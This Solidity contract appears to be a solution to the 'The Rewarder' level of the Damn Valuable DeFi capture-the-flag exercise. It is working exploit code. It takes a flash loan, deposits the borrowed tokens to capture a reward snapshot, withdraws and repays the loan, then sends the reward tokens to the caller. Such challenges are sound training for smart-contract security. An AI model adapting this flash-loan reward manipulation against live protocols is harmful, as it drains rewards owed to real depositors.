// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { FlashLoanerPool } from "../the-rewarder/FlashLoanerPool.sol";
import { TheRewarderPool } from "../the-rewarder/TheRewarderPool.sol";
import { RewardToken } from "../the-rewarder/RewardToken.sol";
import "../DamnValuableToken.sol";

contract HackTheRewarder {
    FlashLoanerPool flashLoan;
    TheRewarderPool pool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;

    constructor(FlashLoanerPool _flashLoan, TheRewarderPool _pool, DamnValuableToken _liquidityToken, RewardToken _rewardToken) {
        flashLoan = _flashLoan;
        pool = _pool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
    }

    function hack(uint amount) public {
        /** @notice 
            We're going to call the flashLoan function inside the FlashLoanerPool contract
        */
        flashLoan.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) public {
        /** @notice 
            Once we receive the loan, we're going to approve the rewarderPool to use our liquidity tokens
        */
        liquidityToken.approve(address(pool), amount);
        /** @notice 
            Then, we're going to deposit our tokens in the pool
        */
        pool.deposit(amount);
        /** @notice 
            Once ours liquidity tokens are deposited, it's going to distribute the rewards
            We're going to withdraw our liquidity tokens
        */
        pool.withdraw(amount);
        /** @notice 
            We're transfer back the liquidity tokens to the FlashLoanerPool
        */
        liquidityToken.transfer(msg.sender, amount);
        /** @notice 
            Then, we transfer the reward tokens to our EOA
        */
        rewardToken.transfer(tx.origin, rewardToken.balanceOf(address(this)));
    }

}